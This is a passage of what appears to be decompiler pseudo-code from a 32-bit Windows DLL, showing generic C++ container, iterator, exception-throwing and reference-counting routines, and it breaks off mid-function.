_DWORD *__thiscall sub_10043E2A(_DWORD *Block, char a2)
{
  sub_10043B80(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10043E85) --------------------------------------------------------
int __usercall sub_10043E85@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10043EC5) --------------------------------------------------------
int __usercall sub_10043EC5@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10043EF6) --------------------------------------------------------
_DWORD *__thiscall sub_10043EF6(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095AC8;
  a2[1] = this;
  *a2 = &off_10095B08;
  a2[2] = a3;
  return result;
}
// 10095AC8: using guessed type int (__thiscall *off_10095AC8)(void *Block, char);
// 10095B08: using guessed type int (__thiscall *off_10095B08)(void *Block, char);

//----- (10043F2E) --------------------------------------------------------
void *__thiscall sub_10043F2E(_DWORD *this)
{
  void *result; // eax

  result = &loc_100749F3;
  *this = &off_10095B08;
  *this = &off_10095AC8;
  return result;
}
// 10095AC8: using guessed type int (__thiscall *off_10095AC8)(void *Block, char);
// 10095B08: using guessed type int (__thiscall *off_10095B08)(void *Block, char);

//----- (10043F58) --------------------------------------------------------
bool __thiscall sub_10043F58(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10043F6F) --------------------------------------------------------
BOOL __thiscall sub_10043F6F(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10043F79) --------------------------------------------------------
int __thiscall sub_10043F79(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10043FB4) --------------------------------------------------------
int __thiscall sub_10043FB4(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10043FEA) --------------------------------------------------------
int __thiscall sub_10043FEA(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10044012) --------------------------------------------------------
int __thiscall sub_10044012(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1004404D) --------------------------------------------------------
int __thiscall sub_1004404D(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10044066) --------------------------------------------------------
_DWORD *__thiscall sub_10044066(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095AE8;
  a2[1] = this;
  *a2 = &off_10095B28;
  a2[2] = a3;
  return result;
}
// 10095AE8: using guessed type int (__thiscall *off_10095AE8)(void *Block, char);
// 10095B28: using guessed type int (__thiscall *off_10095B28)(void *Block, char);

//----- (1004409E) --------------------------------------------------------
void *__thiscall sub_1004409E(_DWORD *this)
{
  void *result; // eax

  result = &loc_100749CF;
  *this = &off_10095B28;
  *this = &off_10095AE8;
  return result;
}
// 10095AE8: using guessed type int (__thiscall *off_10095AE8)(void *Block, char);
// 10095B28: using guessed type int (__thiscall *off_10095B28)(void *Block, char);

//----- (100440C8) --------------------------------------------------------
bool __thiscall sub_100440C8(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100440DF) --------------------------------------------------------
BOOL __thiscall sub_100440DF(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100440E9) --------------------------------------------------------
int __thiscall sub_100440E9(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10044124) --------------------------------------------------------
int __thiscall sub_10044124(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1004415A) --------------------------------------------------------
int __thiscall sub_1004415A(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10044182) --------------------------------------------------------
int __thiscall sub_10044182(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100441BD) --------------------------------------------------------
int __thiscall sub_100441BD(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100441D6) --------------------------------------------------------
_DWORD *__thiscall sub_100441D6(_DWORD *Block, char a2)
{
  sub_10043F2E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100441F2) --------------------------------------------------------
_DWORD *__thiscall sub_100441F2(_DWORD *Block, char a2)
{
  sub_1004409E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004423C) --------------------------------------------------------
_DWORD *__usercall sub_1004423C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1000AF44((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10044269) --------------------------------------------------------
_DWORD *__stdcall sub_10044269(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // esi

  sub_10044A96(a1);
  v2 = 1;
  for ( *a1 = &off_100959D8; v2 < a2; v2 *= 2 )
    ;
  sub_10044B23(a1, v2);
  return a1;
}
// 100959D8: using guessed type int (__thiscall *off_100959D8)(void *Block, char);

//----- (100442B2) --------------------------------------------------------
int *__thiscall sub_100442B2(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_1000AEC7(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100442F4) --------------------------------------------------------
void *__thiscall sub_100442F4(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100959D8;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_1000AEC7(v2);
  this[3] = 0;
  v5 = -1;
  return sub_10043B80(this);
}
// 100959D8: using guessed type int (__thiscall *off_100959D8)(void *Block, char);

//----- (10044355) --------------------------------------------------------
int __thiscall sub_10044355(_DWORD *this)
{
  return this[1];
}

//----- (10044359) --------------------------------------------------------
char __thiscall sub_10044359(_DWORD *this, int a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // ecx
  _DWORD *v9; // eax
  _DWORD *v10; // edi
  bool v11; // zf
  int v12; // ebx
  char result; // al
  _DWORD *v14; // [esp+Ch] [ebp-8h]
  int v15; // [esp+10h] [ebp-4h]
  int v16; // [esp+20h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B64D1);
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 12 * v7;
    v16 = 12 * v7;
    v15 = v7 - a3;
    while ( 1 )
    {
      v9 = (_DWORD *)(v8 + this[3]);
      v10 = v9 - 3;
      v14 = v9;
      sub_1004423C(v9, v9 - 3);
      v16 -= 12;
      v11 = v15-- == 1;
      *((_BYTE *)v14 + 8) = *((_BYTE *)v10 + 8);
      if ( v11 )
        break;
      v8 = v16;
    }
  }
  v12 = this[3] + 12 * a3;
  sub_1004423C((_DWORD *)v12, (_DWORD *)a2);
  result = *(_BYTE *)(a2 + 8);
  *(_BYTE *)(v12 + 8) = result;
  ++this[1];
  return result;
}

//----- (100443E9) --------------------------------------------------------
int __thiscall sub_100443E9(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10044401) --------------------------------------------------------
int __thiscall sub_10044401(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ebx
  int v5; // ebx
  unsigned int v7; // [esp+Ch] [ebp-4h]
  int v8; // [esp+18h] [ebp+8h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B64D2);
  v3 = *this;
  --this[1];
  v7 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v8 = 12 * a2;
    do
    {
      v4 = this[3] + v8;
      sub_1004423C((_DWORD *)v4, (_DWORD *)(v4 + 12));
      ++v7;
      v8 += 12;
      *(_BYTE *)(v4 + 8) = *(_BYTE *)(v4 + 20);
    }
    while ( v7 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v5 = this[3] + 12 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1004423C((_DWORD *)v5, dword_100BFA38);
  *(_BYTE *)(v5 + 8) = byte_100BFA40;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BFA38: using guessed type _DWORD dword_100BFA38[2];
// 100BFA40: using guessed type char byte_100BFA40;

//----- (1004448C) --------------------------------------------------------
int __thiscall sub_1004448C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B64D3);
  return this[3] + 12 * a2;
}

//----- (100444AB) --------------------------------------------------------
int __thiscall sub_100444AB(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B64DB);
  return this[3] + 12 * a2;
}

//----- (100444CA) --------------------------------------------------------
char *__thiscall sub_100444CA(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_1000AEC7(v3);
  }
  return result;
}

//----- (100444F0) --------------------------------------------------------
int __thiscall sub_100444F0(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_1000AEC7(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10044517) --------------------------------------------------------
BOOL __thiscall sub_10044517(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10044522) --------------------------------------------------------
int __thiscall sub_10044522(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  unsigned int v8; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = a2;
  v8 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 12 * a2;
    for ( i = 12 * a2; ; v4 = i )
    {
      v5 = v4 + this[3];
      sub_1004423C((_DWORD *)v5, dword_100BFA38);
      ++v8;
      i += 12;
      *(_BYTE *)(v5 + 8) = byte_100BFA40;
      if ( v8 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
        break;
    }
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v6 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v6 + 88))(this);
}
// 100BFA38: using guessed type _DWORD dword_100BFA38[2];
// 100BFA40: using guessed type char byte_100BFA40;

//----- (10044590) --------------------------------------------------------
unsigned int __thiscall sub_10044590(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B64E5);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1004460C) --------------------------------------------------------
unsigned int __thiscall sub_1004460C(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10044634) --------------------------------------------------------
unsigned int __stdcall sub_10044634(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10044645) --------------------------------------------------------
unsigned int __thiscall sub_10044645(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v10; // eax
  unsigned int result; // eax
  char *v13; // ebx
  unsigned int v14; // [esp+20h] [ebp+8h]
  char *Blocka; // [esp+28h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (12 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 12 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 0xCu, v5, (void (__thiscall *)(void *))sub_10044A6F, sub_1000AEE5);
  }
  v14 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    Blocka = 0;
    do
    {
      v13 = &Blocka[this[3]];
      sub_1004423C(v13, (_DWORD *)a3);
      ++v14;
      Blocka += 12;
      v13[8] = *(_BYTE *)(a3 + 8);
      a3 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v14 < result );
  }
  return result;
}
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 10051BC9: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044706) --------------------------------------------------------
void *__thiscall sub_10044706(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // edi
  int v8; // ecx
  int *v9; // eax
  char *v10; // ebx
  _BYTE *v11; // ebx
  char *v12; // [esp+8h] [ebp-20h]
  char *Block; // [esp+Ch] [ebp-1Ch]
  unsigned int v14; // [esp+10h] [ebp-18h]
  int v15; // [esp+14h] [ebp-14h]
  char *v16; // [esp+18h] [ebp-10h]

  result = &loc_1007AD00;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v15 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v15 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v12 = v7;
      v8 = (12 * (unsigned __int64)(unsigned int)v15) >> 32 != 0 ? -1 : 12 * v15;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        *v9 = v15;
        v10 = (char *)(v9 + 1);
        `eh vector constructor iterator'(v9 + 1, 0xCu, v15, (void (__thiscall *)(void *))sub_10044A6F, sub_1000AEE5);
        v16 = v10;
      }
      else
      {
        v16 = 0;
      }
      v14 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = v16 + 8;
        Block = (char *)(v7 - v16);
        do
        {
          sub_1004423C((_DWORD *)v11 - 2, v7);
          ++v14;
          *v11 = v11[(_DWORD)Block];
          v7 += 12;
          v11 += 12;
        }
        while ( v14 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
        v7 = v12;
      }
      this[3] = v16;
      if ( v7 )
        sub_1000AEC7(v7);
      result = (void *)v15;
      this[2] = v15;
    }
  }
  return result;
}
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 10051BC9: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044827) --------------------------------------------------------
_DWORD *__stdcall sub_10044827(_DWORD *a1)
{
  sub_10044B90(a1);
  return a1;
}

//----- (10044837) --------------------------------------------------------
_DWORD *__usercall sub_10044837@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100415B9((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10044867) --------------------------------------------------------
_DWORD *__stdcall sub_10044867(_DWORD *a1)
{
  sub_10044BEE(a1);
  return a1;
}

//----- (10044882) --------------------------------------------------------
void __thiscall sub_10044882(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10044C3A((int)this);
}

//----- (100448BE) --------------------------------------------------------
_DWORD *__usercall sub_100448BE@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (100448D2) --------------------------------------------------------
void __thiscall sub_100448D2(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10044CB8((int)this);
}

//----- (10044925) --------------------------------------------------------
_DWORD *__userpurge sub_10044925@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044969) --------------------------------------------------------
void __thiscall sub_10044969(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10044CF2((int)this);
}

//----- (100449BC) --------------------------------------------------------
_DWORD *__userpurge sub_100449BC@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044A00) --------------------------------------------------------
void __thiscall sub_10044A00(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10044D2C((int)this);
}

//----- (10044A3F) --------------------------------------------------------
_DWORD *__thiscall sub_10044A3F(_DWORD *Block, char a2)
{
  sub_100442F4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10044A6F) --------------------------------------------------------
int __thiscall sub_10044A6F(void *this)
{
  return sub_1000999B((int)this, 0);
}

//----- (10044A78) --------------------------------------------------------
char *__usercall sub_10044A78@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_100448D2);
  j_j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (10044A96) --------------------------------------------------------
_DWORD *__stdcall sub_10044A96(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10095A90;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095A90: using guessed type int (__thiscall *off_10095A90)(void *Block, char);

//----- (10044AC5) --------------------------------------------------------
_DWORD *__thiscall sub_10044AC5(_DWORD *this)
{
  _DWORD *result; // eax

  result = &loc_10079213;
  if ( *this )
  {
    sub_1000AF44((int)this);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    *this = 0;
    this[1] = result;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044B23) --------------------------------------------------------
void __usercall sub_10044B23(_DWORD *a1@<edi>, unsigned int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (12 * (unsigned __int64)a2) >> 32 != 0 ? -1 : 12 * a2;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 0xCu, a2, (void (__thiscall *)(void *))sub_10044A6F, sub_1000AEE5);
  }
  a1[3] = v2;
}
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 10051BC9: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044B90) --------------------------------------------------------
_DWORD *__thiscall sub_10044B90(_DWORD *this)
{
  _DWORD *result; // eax

  result = &loc_100791FF;
  if ( *this )
  {
    sub_100415B9((int)this);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    *this = 0;
    this[1] = result;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044BEE) --------------------------------------------------------
_DWORD *__thiscall sub_10044BEE(_DWORD *this)
{
  _DWORD *result; // eax

  result = &loc_100791EB;
  if ( *this )
  {
    sub_100097E7((int)this);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    *this = 0;
    this[1] = result;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044C3A) --------------------------------------------------------
void __usercall sub_10044C3A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10044C62) --------------------------------------------------------
_DWORD *__userpurge sub_10044C62@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044CB8) --------------------------------------------------------
void __usercall sub_10044CB8(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10044CF2) --------------------------------------------------------
void __usercall sub_10044CF2(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
